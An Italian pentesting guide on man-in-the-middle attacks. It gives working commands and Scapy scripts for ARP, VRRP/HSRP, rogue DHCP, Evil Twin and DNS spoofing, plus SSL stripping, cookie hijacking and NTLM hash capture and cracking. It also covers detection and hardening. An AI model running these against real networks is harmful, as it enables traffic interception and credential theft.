---
title: >-
  Man in the Middle (MITM): Cos'è e tecniche reali per intercettare traffico e
  credenziali
slug: man-in-the-middle
description: >-
  Guida completa al Man in the Middle: ARP spoofing, SSL stripping, session
  hijacking, rogue DHCP, Evil Twin e tecniche MITM reali su reti enterprise e
  Wi-Fi.
image: /man-in-the-middle.webp
draft: false
date: 2026-03-30T00:00:00.000Z
categories:
  - guides-resources
subcategories:
  - concetti
tags:
  - arp
  - ssl-stripping
  - mitm
featured: true
---

Il man in the middle è uno degli attacchi più potenti e versatili nel toolkit di un pentester. Capire cos'è un attacco MITM e come funziona nella pratica significa capire come un attaccante si inserisce silenziosamente tra due host, legge tutto il traffico, lo modifica in tempo reale, e sparisce senza lasciare traccia nei log applicativi. Non è teoria: è una tecnica che funziona oggi, sulle reti che usi ogni giorno.

***

## Cos'è un attacco Man in the Middle

Un attacco man in the middle (abbreviato MITM) è una tecnica offensiva in cui un attaccante si posiziona nel mezzo del canale di comunicazione tra due parti — tipicamente un client e un server — intercettando, leggendo e potenzialmente modificando il traffico senza che né il mittente né il destinatario se ne accorgano.

Il nome descrive esattamente la posizione: l'attaccante è letteralmente *nel mezzo*, tra A e B. A pensa di parlare con B, B pensa di parlare con A, ma entrambi parlano con l'attaccante.

La struttura è sempre la stessa, indipendentemente dalla tecnica usata per arrivarci:

```
Client ←→ [ATTACCANTE] ←→ Server
```

L'attaccante mantiene due sessioni attive simultaneamente: una con il client e una con il server. Riceve i dati da entrambi, può modificarli, e li ri-inoltra all'altra parte. Il traffico continua a fluire — la connessione funziona — ma passa interamente attraverso l'attaccante.

### Perché il MITM è così pericoloso

A differenza degli attacchi di brute force o dei vulnerability exploit, il MITM non rompe nulla. Non genera errori. Non fallisce con messaggi di accesso negato. Se eseguito correttamente, è completamente invisibile alle vittime e ai sistemi di detection che monitorano solo il traffico di destinazione finale.

Le conseguenze reali di un MITM riuscito:

* Credenziali di accesso catturate in chiaro (HTTP, FTP, SMTP, LDAP non cifrati)
* Session token rubati per session hijacking
* Contenuto modificato in transito (inject di payload malevoli in pagine HTTP)
* Downgrade da HTTPS a HTTP tramite SSL stripping
* Redirect verso server malevoli tramite DNS spoofing
* Intercettazione di comunicazioni aziendali riservate

***

## Come funziona un attacco MITM: le fasi

### Fase 1: Posizionamento

L'attaccante deve prima posizionarsi nel path del traffico. Questo è il cuore tecnico del MITM: senza questa fase, tutto il resto non è possibile. Le tecniche per farlo sono diverse e verranno approfondite nelle sezioni successive.

### Fase 2: Intercettazione

Una volta nel path, il traffico transita attraverso l'attaccante. Con il forwarding IP abilitato sulla propria macchina, l'attaccante re-instrada i pacchetti verso la destinazione legittima mantenendo la connessione attiva:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Senza questo step, l'attacco diventa un DoS: il traffico arriva all'attaccante e si ferma lì.

### Fase 3: Analisi e manipolazione

Con il traffico che fluisce attraverso l'interfaccia, l'attaccante può:

* **Sniffare passivamente**: registrare tutto senza modificare nulla
* **Iniettare attivamente**: inserire payload nel traffico in transito
* **Strip della cifratura**: degradare HTTPS a HTTP con SSL stripping
* **Modificare risposte**: alterare contenuto HTML, JSON, o binario

### Fase 4: Relay

Il traffico viene re-inoltrato alla destinazione originale. La connessione rimane operativa. La vittima non nota interruzioni.

***

## Tecniche MITM: come ci si posiziona nel mezzo

### ARP Spoofing (ARP Poisoning)

L'ARP spoofing è la tecnica MITM più usata su reti locali. Sfrutta una caratteristica strutturale del protocollo [ARP](https://hackita.it/articoli/arp): non ha autenticazione. Qualsiasi host può inviare una ARP Reply affermando di essere chiunque.

L'attaccante invia Gratuitous ARP Reply false a entrambe le vittime:

* Alla vittima A dice: *"L'IP del gateway è il mio MAC"*
* Al gateway dice: *"L'IP della vittima A è il mio MAC"*

Entrambi aggiornano la propria ARP cache con il MAC dell'attaccante. Da quel momento, tutto il traffico tra A e il gateway passa per l'attaccante.

```bash
# Con arpspoof (dsniff suite)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # Avvelena la vittima
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # Avvelena il gateway

# Con bettercap (più moderno, tutto integrato)
bettercap -iface eth0
# Dentro bettercap:
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

Per i dettagli tecnici sul protocollo ARP e le sue vulnerabilità, vedi la guida completa su [ARP: cos'è e come funziona](https://hackita.it/articoli/arp-address-resolution-protocol).

### Rogue Gateway via VRRP/HSRP Spoofing

Una tecnica MITM meno conosciuta ma molto efficace in ambienti enterprise: sfruttare i protocolli di ridondanza del gateway come HSRP, VRRP, e CARP.

Questi protocolli non hanno autenticazione di default. Inviando un annuncio con Priority 255, l'attaccante diventa il gateway attivo dell'intero segmento. Tutto il traffico degli host verso l'esterno passa automaticamente per lui — senza toccare ARP, senza modificare routing table degli host, senza generare anomalie ARP visibili ai tool di detection standard.

```bash
# Con Yersinia
yersinia hsrp -attack 1 -interface eth0   # Diventa router HSRP attivo

# Con Scapy per VRRP
from scapy.all import *
vrrp = (Ether(dst="01:00:5e:00:00:12") /
        IP(dst="224.0.0.18", ttl=255, proto=112) /
        VRRP(vrid=1, priority=255, addrlist=["192.168.1.1"]))
sendp(vrrp, iface="eth0", loop=1, inter=1)
```

Approfondisci i protocolli di ridondanza gateway in [VRRP, HSRP e CARP: cos'è e come attaccarli](https://hackita.it/articoli/vrrp-hsrp-carp).

### Rogue DHCP Server

Il server DHCP distribuisce la configurazione di rete ai client: IP, gateway, DNS. Se l'attaccante risponde prima del server legittimo con un DHCP Offer contenente il proprio IP come gateway, tutti i nuovi client della rete usano l'attaccante come default gateway.

```bash
# Setup rogue DHCP con dnsmasq
# /etc/dnsmasq.conf
interface=eth0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.50      # Gateway = attaccante
dhcp-option=6,192.168.1.50      # DNS = attaccante

dnsmasq --no-daemon
```

L'attacco è potente perché colpisce i client *al momento della connessione*, non quelli già configurati. Aspettare che qualcuno si connetta alla rete (laptop che si sveglia, nuovo dispositivo) garantisce MITM trasparente e duraturo.

### Evil Twin (Rogue Access Point Wi-Fi)

In ambienti wireless, l'Evil Twin è l'equivalente del rogue DHCP server: l'attaccante crea un access point con lo stesso SSID della rete legittima. Combinato con un attacco di deauthentication che disconnette i client dall'AP legittimo, forza la riconnessione all'AP malevolo.

```bash
# Deauthentication per forzare la riconnessione
aireplay-ng -0 0 -a <BSSID_legittimo> wlan0mon

# AP Evil Twin con hostapd
cat > /tmp/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=NomeReteLegittima
channel=6
hw_mode=g
EOF
hostapd /tmp/hostapd.conf
```

Una volta connessi all'Evil Twin, tutti i client ricevono DHCP dal server dell'attaccante e il loro traffico è completamente visibile. Per i dettagli sul protocollo wireless e le tecniche di attacco, vedi [Wi-Fi 802.11: cos'è e come attaccarlo](https://hackita.it/articoli/wifi-802-11).

### DNS Spoofing

Il DNS spoofing avvelena la cache del resolver DNS delle vittime con record falsi, reindirizzando il traffico verso IP controllati dall'attaccante.

In combinazione con ARP spoofing (per diventare MITM prima), è possibile intercettare le query DNS in transito e rispondere con record falsi prima del server legittimo:

```bash
# Con bettercap — dns.spoof
set dns.spoof.domains hackita.it,*.corp.internal
set dns.spoof.address 192.168.1.50
dns.spoof on
```

Oppure avvelenare direttamente la cache del resolver locale con Scapy:

```python
from scapy.all import *

def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        spoofed = (
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname,
                         ttl=300,
                         rdata="192.168.1.50"))
        )
        send(spoofed, verbose=0)

sniff(filter="udp port 53", prn=spoof_dns, iface="eth0")
```

### ICMP Redirect

I messaggi ICMP Redirect vengono usati dai router per suggerire percorsi alternativi agli host. Inviando ICMP Redirect falsi, l'attaccante può modificare le routing table degli host vittima senza toccare ARP:

```python
from scapy.all import *

# Dice alla vittima che il percorso ottimale verso target passa per l'attaccante
send(IP(src=gateway_ip, dst=victim_ip) /
     ICMP(type=5, code=1, gw=attacker_ip) /
     IP(src=victim_ip, dst=target_ip) /
     UDP())
```

Tecnica più silenziosa dell'ARP spoofing: genera meno traffico anomalo e raramente viene monitorata.

***

## SSL Stripping: il downgrade da HTTPS a HTTP

L'SSL stripping è la tecnica che rende il MITM devastante anche in presenza di HTTPS. L'idea è semplice: il client chiede una risorsa HTTP, l'attaccante fa la richiesta al server in HTTPS, riceve la risposta cifrata, la decifra, e la ri-serve al client in chiaro su HTTP.

```
Client --[HTTP]--> Attaccante --[HTTPS]--> Server
Client <-[HTTP]-- Attaccante <-[HTTPS]-- Server
```

Il server pensa di parlare con un client che usa HTTPS. Il client pensa di parlare con un server HTTP. L'attaccante vede tutto in chiaro.

```bash
# Con sslstrip (tool originale)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Con bettercap (più efficace, aggira alcune protezioni)
set https.proxy.sslstrip true
https.proxy on
```

### Perché SSL stripping funziona ancora

SSL stripping è mitigato da **HSTS (HTTP Strict Transport Security)**: un header che forza il browser a usare sempre HTTPS per quel dominio. Se il sito ha HSTS configurato correttamente, il browser rifiuta di connettersi in HTTP.

Ma HSTS ha un limite fondamentale: funziona solo se il client ha già visitato il sito almeno una volta e ha memorizzato la policy. Al **primo accesso** (o se il client non ha la entry in cache), SSL stripping funziona ancora. Esistono varianti avanzate come **HSTS bypass** che sfruttano sottodomini non nella preload list.

Per una comprensione approfondita di TLS e come viene attaccato, vedi [TLS/SSL: cos'è e come analizzarlo in un pentest](https://hackita.it/articoli/tls-ssl).

***

## Session Hijacking

Il session hijacking è il passo successivo al MITM su traffico HTTP: rubare il session token di un utente già autenticato per impersonarlo senza conoscere le credenziali.

Dopo aver effettuato MITM e SSL stripping (o su traffico HTTP puro), intercettare i cookie di sessione è triviale:

```bash
# Con bettercap — mostra i cookie in transito
net.sniff on
# Filtra per Set-Cookie e Cookie headers
```

Con il session token, accedere all'applicazione come la vittima:

```bash
curl -b "session=abc123def456" https://target.com/dashboard
```

O nel browser con Cookie Editor (estensione):

1. Apri il sito come ospite
2. Modifica il valore del cookie di sessione con quello catturato
3. Ricarica la pagina → sei autenticato come la vittima

### Timing e finestra di attacco

I session token hanno una scadenza. L'attacco deve essere eseguito mentre il token è ancora valido. Nei moderni sistemi con sessioni brevi (15-30 minuti), la finestra è stretta. Su applicazioni legacy con sessioni di giorni o settimane, il rischio è molto più alto.

***

## Attacchi MITM reali: casi pratici da engagement

### Scenario 1: LAN corporate senza autenticazione 802.1X

Target: rete ufficio con switch non gestiti o senza DHCP Snooping/DAI.

1. Connessione fisica a una porta libera
2. ARP spoofing verso la vittima e il gateway
3. SSL stripping sul traffico HTTPS
4. Cattura credenziali su portal intranet HTTP, LDAP in chiaro, SMTP non cifrato

Strumenti: bettercap, Wireshark, Responder (per credenziali NTLM)

### Scenario 2: Evil Twin in area pubblica o corporate Wi-Fi

Target: utenti che si riconnettono automaticamente a SSID noti.

1. Deauthentication dall'AP legittimo
2. Evil Twin con stesso SSID + canale diverso + segnale più forte
3. DHCP con gateway = attaccante, DNS = attaccante
4. SSL stripping e DNS spoofing per phishing delle credenziali

Strumenti: aircrack-ng suite, hostapd, dnsmasq, bettercap

### Scenario 3: HSRP Takeover in rete enterprise

Target: segmento con switch Cisco e HSRP senza autenticazione.

1. Ascolto passivo del traffico HSRP (multicast 224.0.0.2)
2. Invio Hello HSRP con Priority 255
3. Divento router Active dell'intero segmento
4. Tutto il traffico verso Internet e verso altri segmenti passa per me
5. Sniffing di massa su tutti gli host del VLAN

Strumenti: Yersinia, Scapy, Wireshark

Questo scenario è particolarmente critico perché bypassa completamente i controlli ARP — nessun tool di detection basato su ARP lo rileva. Il cambiamento è visibile solo nel traffico HSRP o nella variazione del MAC del gateway.

### Scenario 4: Rogue DHCP + DNS Spoofing per credential harvesting

Target: utenti che si connettono alla rete (laptop in uscita e rientro, ospiti, nuovi dispositivi).

1. DHCP starvation per esaurire il pool del server legittimo
2. Rogue DHCP server che risponde più velocemente del server esausto
3. I client ottengono gateway e DNS dell'attaccante
4. DNS spoofing verso phishing page dell'applicazione aziendale
5. Raccolta credenziali

Strumenti: yersinia (DHCP starvation), dnsmasq, bettercap

***

## Tool MITM: panoramica pratica

### bettercap

Lo strumento MITM più completo e moderno. Integra in un'unica console: ARP spoofing, DNS spoofing, SSL stripping, sniffing, injection, Evil Twin, BLE e Wi-Fi attacks.

```bash
# Installazione
apt install bettercap

# Sessione MITM completa
bettercap -iface eth0 -eval "net.probe on; arp.spoof on; net.sniff on"

# Con moduli specifici
set arp.spoof.targets 192.168.1.10
set dns.spoof.domains *.target.com
set dns.spoof.address 192.168.1.50
arp.spoof on
dns.spoof on
net.sniff on
```

### Wireshark + tshark

Analisi passiva del traffico catturato. Filtri utili per MITM:

```
# Credenziali HTTP
http.request.method == "POST" && http contains "password"

# Cookie di sessione
http.cookie

# Credenziali FTP
ftp.request.command == "PASS"

# Credenziali SMTP
smtp contains "AUTH"

# Traffico DNS alterato (risposta con TTL insolito)
dns.flags.response == 1 && dns.resp.ttl < 10

# ARP spoofing (stesso IP con MAC diversi)
arp.duplicate-address-detected
```

### Responder

Specializzato nel catturare hash NTLM/NTLMv2 su reti Windows. In posizione MITM, risponde alle richieste NBT-NS, LLMNR, e MDNS con il proprio IP, forzando i client Windows a tentare l'autenticazione:

```bash
responder -I eth0 -rdwv

# Output tipico:
# [SMB] NTLMv2-SSP Username: CORP\jsmith
# [SMB] NTLMv2-SSP Hash: jsmith::CORP:1122334455667788:...
```

Gli hash NTLMv2 possono essere attaccati offline con hashcat:

```bash
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

### mitmproxy

Proxy MITM interattivo per HTTP/HTTPS con supporto a script Python per modifiche in tempo reale al traffico:

```bash
# Proxy MITM su porta 8080
mitmproxy -p 8080

# Con script per inject di payload
mitmproxy -p 8080 -s inject_script.py
```

Eccellente per web application pentesting: permette di intercettare, modificare e ri-inviare singole richieste HTTPS come Burp Suite ma a livello di rete, trasparente all'applicazione.

### ettercap

Storico tool MITM ancora utile per quick tests:

```bash
# ARP spoofing con ettercap su rete locale
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//

# Con plugin per SSL stripping
ettercap -T -q -i eth0 -M arp:remote -P sslstrip /192.168.1.10// /192.168.1.1//
```

***

## Catturare credenziali in chiaro: checklist dei protocolli

In posizione MITM su una rete enterprise, questi protocolli trasmettono credenziali in chiaro o in formato facilmente attaccabile:

| Protocollo      | Porta  | Credenziali                | Tool                 |
| --------------- | ------ | -------------------------- | -------------------- |
| HTTP            | 80     | Username/password nei form | bettercap, Wireshark |
| FTP             | 21     | USER + PASS in chiaro      | tcpdump, Wireshark   |
| Telnet          | 23     | Login completo in chiaro   | Wireshark            |
| SMTP            | 25     | AUTH LOGIN in base64       | Wireshark            |
| POP3            | 110    | USER + PASS in chiaro      | Wireshark            |
| IMAP            | 143    | LOGIN command in chiaro    | Wireshark            |
| LDAP            | 389    | Bind DN + password         | Wireshark            |
| HTTP Basic Auth | 80/443 | Base64 decodificabile      | Wireshark            |
| SNMP v1/v2c     | 161    | Community string in chiaro | Wireshark            |
| SMB/NTLM        | 445    | Hash NTLMv2                | Responder + hashcat  |
| Kerberos        | 88     | TGT/ST crackabili          | Responder, impacket  |

Tutti i protocolli su [TCP](https://hackita.it/articoli/tcp) non cifrati sono vulnerabili in posizione MITM. Per i dettagli su sniffing del traffico in chiaro, vedi la guida su [sniffing su reti locali](https://hackita.it/articoli/sniffing).

***

## MITM su HTTPS: attacchi avanzati

### SSL Stripping

Come già descritto: intercetta le richieste HTTP, fa le richieste al server in HTTPS, serve al client in HTTP. Efficace contro siti senza HSTS o alla prima visita.

### HSTS Bypass con NTP downgrade

Tecnica avanzata: manomettendo l'orologio del client tramite un rogue NTP server (distribuito via DHCP option 42), si può far scadere artificialmente la HSTS policy memorizzata nel browser, riaprendo la finestra all'SSL stripping.

### Certificato falso (richiede CA installata sul client)

In ambienti aziendali con MDM o GPO che distribuiscono certificati CA interni, l'attaccante che ha compromesso la CA interna può generare certificati validi per qualsiasi dominio. Il browser mostra il lucchetto verde anche su un MITM completo.

### TLS session ticketing e resumption

Se il server supporta TLS session tickets senza rotazione frequente delle chiavi, l'attaccante che cattura un session ticket può tentare di riusarlo per decifrare sessioni future. Tecnica avanzata, richiede accesso alle chiavi del server.

***

## MITM in un engagement di pentesting

### Reconnaissance

Prima di eseguire qualsiasi attacco attivo, identificare il layout della rete:

```bash
# Scoprire host attivi e gateway
arp-scan --localnet

# Identificare il router HSRP/VRRP attivo
tcpdump -i eth0 -nn 'udp port 1985 or proto 112'

# Verificare se DHCP Snooping è attivo (prova a fare un rogue offer)
yersinia dhcp -attack 2 -interface eth0
```

### Posizionamento silenzioso

Preferire tecniche che generano meno rumore:

* **HSRP/VRRP takeover**: zero traffico ARP anomalo, massimo impatto
* **Rogue DHCP**: colpisce nuovi client, non quelli esistenti
* **ICMP Redirect**: modifica routing senza toccare ARP
* **ARP spoofing**: più rumoroso ma più veloce e universale

### Analisi post-positioning

```bash
# Verificare di essere nel path
tcpdump -i eth0 -nn host 192.168.1.10
# Dovrei vedere traffico che non è destinato a me

# Estrarre tutte le credenziali in chiaro
tshark -i eth0 -Y "http.request.method==POST or ftp.request.command==PASS" \
  -T fields -e http.request.uri -e http.file_data

# Monitor sessioni attive
ss -tnp
```

### Cleanup

Ripristinare l'ARP cache delle vittime alla fine dell'engagement:

```bash
# Fermare arp.spoof su bettercap
arp.spoof off

# Inviare ARP Reply corrette manualmente
arping -c 5 -I eth0 -S 192.168.1.1 192.168.1.10   # Ripristina gateway → vittima
arping -c 5 -I eth0 -S 192.168.1.10 192.168.1.1    # Ripristina vittima → gateway
```

***

## Detection del MITM: come si vede dall'interno

Un difensore che monitora la rete può rilevare un attacco MITM da diversi segnali:

### ARP anomalie

```bash
# Linux — monitoraggio variazioni ARP
arpwatch -i eth0
# Alert: "changed ethernet address" → MAC del gateway cambiato → ARP spoofing

# Windows
arp -a
# Cercare: stesso IP con MAC diverso da quello atteso
```

### Variazioni del gateway MAC

```bash
# Monitorare il MAC del default gateway
EXPECTED_MAC="aa:bb:cc:dd:ee:ff"
CURRENT_MAC=$(arp -n 192.168.1.1 | awk '/192.168.1.1/{print $3}')
[ "$CURRENT_MAC" != "$EXPECTED_MAC" ] && echo "ALERT: Gateway MAC changed!"
```

### TTL anomali nel traffico

In posizione MITM, i pacchetti subiscono un hop aggiuntivo — il TTL si riduce di 1 in più del normale. Su un client che monitora il TTL dei pacchetti ricevuti, questo è rilevabile.

### Certificati TLS inattesi

```bash
# Verificare il fingerprint del certificato
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -fingerprint -noout

# Se il fingerprint cambia tra sessioni, possibile MITM attivo
```

### Traffico HSRP/VRRP anomalo

```bash
# Monitorare annunci con priority 255 da IP sconosciuti
tcpdump -i eth0 -nn 'udp port 1985' | grep -E "priority (200|255)"
```

***

## Difesa contro gli attacchi Man in the Middle

### Livello 2: Dynamic ARP Inspection (DAI)

La difesa principale contro ARP spoofing sugli switch managed:

```
! Cisco — DAI richiede DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10
ip arp inspection vlan 10
ip arp inspection validate src-mac dst-mac ip
```

Scarta tutti i pacchetti ARP che non corrispondono alla binding table IP/MAC/porta costruita da DHCP Snooping.

### Livello 2: DHCP Snooping

Blocca i rogue DHCP server accettando DHCP Offer solo dalle porte "trusted":

```
ip dhcp snooping
interface GigabitEthernet1/0/24   ! Uplink
 ip dhcp snooping trust
```

### Livello 2: HSRP/VRRP Authentication

```
! HSRP con MD5
standby 1 authentication md5 key-string <strong-password>
```

Previene il HSRP takeover da host non autorizzati. Per i dettagli, vedi [VRRP, HSRP e CARP: hardening](https://hackita.it/articoli/vrrp-hsrp-carp).

### Livello 2: 802.1X Network Access Control

Autenticare ogni dispositivo prima di permettergli l'accesso alla rete. Un host non autenticato non può inviare traffico — elimina la possibilità di ARP spoofing da host non autorizzati.

### Livello 3: HSTS e HSTS Preload

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Forza il browser a usare sempre HTTPS, rendendo SSL stripping inefficace su siti già visitati. Il preload list garantisce HSTS dalla prima visita senza necessità di connessioni HTTP precedenti.

### Livello 4: Certificate Pinning

Per applicazioni mobile e API critiche, il pinning del certificato (o del public key) impedisce che un certificato diverso dall'originale venga accettato, anche se firmato da una CA fidata.

### Livello 4: TLS mutual authentication (mTLS)

In ambienti zero-trust, sia client che server presentano certificati per l'autenticazione reciproca. Un MITM non può completare l'handshake TLS senza il certificato client legittimo.

Per tutti i dettagli su TLS e le sue protezioni contro MITM, vedi [TLS/SSL: cos'è e come funziona](https://hackita.it/articoli/tls-ssl).

### Monitoraggio: arpwatch e ZeroTrustNetwork

```bash
# arpwatch — baseline e detection variazioni
apt install arpwatch
arpwatch -i eth0 -m admin@corp.internal

# Log in /var/log/arpwatch.log
# Alert via email su ogni variazione di binding IP/MAC
```

***

## MITM vs cifratura end-to-end: cosa protegge e cosa no

Una confusione comune: "usiamo HTTPS, non siamo vulnerabili al MITM."

HTTPS protegge dal MITM passivo — chi sniffa il cavo vede traffico cifrato. Ma contro un MITM attivo con SSL stripping, la protezione dipende da HSTS. E HSTS non è universale.

Cosa protegge completamente contro il MITM:

* **TLS con certificate pinning** (applicazioni mobile, API)
* **mTLS** (autenticazione reciproca con certificati)
* **HSTS + preload** (browser web, ma solo per siti nella preload list)
* **VPN end-to-end** (cifratura del layer di rete prima che il MITM possa vederlo)

Cosa non protegge sufficientemente:

* **HTTPS senza HSTS** → vulnerabile a SSL stripping alla prima visita
* **HTTP puro** → completamente visibile
* **Protocolli applicativi non cifrati** (FTP, Telnet, SMTP, LDAP non TLS) → credenziali in chiaro

***

## FAQ su Man in the Middle

**Cos'è un attacco man in the middle?**
Un attacco man in the middle è una tecnica in cui un attaccante si inserisce nel canale di comunicazione tra due host, intercettando e potenzialmente modificando il traffico in transito senza che le vittime se ne accorgano. L'attaccante mantiene due sessioni separate: una con il client e una con il server.

**Qual è la differenza tra ARP spoofing e MITM?**
ARP spoofing è una delle tecniche usate per posizionarsi nel mezzo (MITM). L'ARP spoofing modifica la ARP cache delle vittime, reindirizzando il traffico verso l'attaccante. Il MITM è il risultato — la posizione nel mezzo — che può essere raggiunto anche con altre tecniche come DHCP rogue, HSRP takeover, Evil Twin Wi-Fi, o ICMP redirect.

**HTTPS protegge dal man in the middle?**
Dipende. HTTPS con HSTS configurato correttamente protegge dal MITM passivo e dall'SSL stripping. Ma senza HSTS, SSL stripping può degradare la connessione a HTTP in chiaro. Il certificate pinning offre protezione più robusta per applicazioni critiche.

**Quali tool si usano per eseguire un MITM?**
I tool principali sono bettercap (il più completo e moderno), ettercap (storico), arpspoof (dsniff suite), mitmproxy (per HTTP/HTTPS interattivo), e Responder (per hash NTLM). Wireshark e tshark vengono usati per l'analisi del traffico intercettato.

**Come si rileva un attacco MITM in corso?**
I segnali principali sono: variazione del MAC address associato al gateway (rilevabile con arpwatch), presenza di ARP Reply non sollecitate, TTL dei pacchetti ridotto di 1 rispetto al normale, certificati TLS con fingerprint diverso da quello atteso, traffico HSRP con Priority 255 da IP non autorizzati.

**È legale fare un MITM durante un pentest?**
Solo con esplicita autorizzazione scritta che copra specificamente le tecniche di intercettazione del traffico. Un MITM su reti non autorizzate costituisce reato in Italia ai sensi degli articoli 617-bis, 617-ter e 615-quater del Codice Penale. Operare sempre nell'ambito di un contratto di engagement firmato con scope definito.

***

## Conclusione sul Man in the Middle

Il MITM non è un singolo attacco — è una posizione. Come ci arrivi dipende dalla configurazione della rete: ARP su LAN, HSRP/VRRP su enterprise, Evil Twin su Wi-Fi, rogue DHCP su reti non protette. Una volta lì, le possibilità si moltiplicano: sniffing passivo, SSL stripping, session hijacking, credential harvesting, inject di payload.

La difesa efficace richiede protezioni a più livelli: DAI e DHCP Snooping a livello 2, autenticazione HSRP a livello di routing, HSTS e certificate pinning a livello applicativo. Nessuna singola misura è sufficiente.

In un engagement di internal network pentesting, il MITM è quasi sempre fattibile. La domanda non è "posso" ma "quale tecnica genera meno rumore per questo specifico ambiente."

Approfondisci i protocolli e le tecniche correlate:

* [ARP: address resolution e spoofing](https://hackita.it/articoli/arp)
* [TCP: handshake e session hijacking](https://hackita.it/articoli/tcp)
* [TLS/SSL: cifratura e SSL stripping](https://hackita.it/articoli/tls-ssl)
* [VRRP, HSRP e CARP: gateway spoofing](https://hackita.it/articoli/vrrp-hsrp-carp)
* [Wi-Fi 802.11: Evil Twin e deauthentication](https://hackita.it/articoli/wifi-802-11)
* [DNS: spoofing e cache poisoning](https://hackita.it/articoli/dns)
* [DHCP: rogue server e MITM](https://hackita.it/articoli/dhcp)
* [Ethernet IEEE 802.3: livello datalink e ARP](https://hackita.it/articoli/ethernet-ieee-802-3)
* [VLAN e 802.1Q: segmentazione e MITM cross-VLAN](https://hackita.it/articoli/vlan)
* [IPv4/IPv6: ICMP redirect e NDP spoofing](https://hackita.it/articoli/ipv4-ipv6)
* [IPSec: protezione contro MITM a livello 3](https://hackita.it/articoli/ipsec)
* [NTP: downgrade per HSTS bypass](https://hackita.it/articoli/ntp)

Riferimento tecnico: [RFC 5246 — The TLS Protocol](https://datatracker.ietf.org/doc/html/rfc5246)

***

Vuoi testare se la tua rete è vulnerabile a MITM prima che lo faccia qualcun altro?
Un internal network penetration test copre esattamente questi scenari: [hackita.it/servizi](https://hackita.it/servizi).

HackITA è un progetto indipendente. Ogni articolo richiede ore di lavoro — se lo usi, considera di supportarlo:
[hackita.it/supporto](https://hackita.it/supporto)
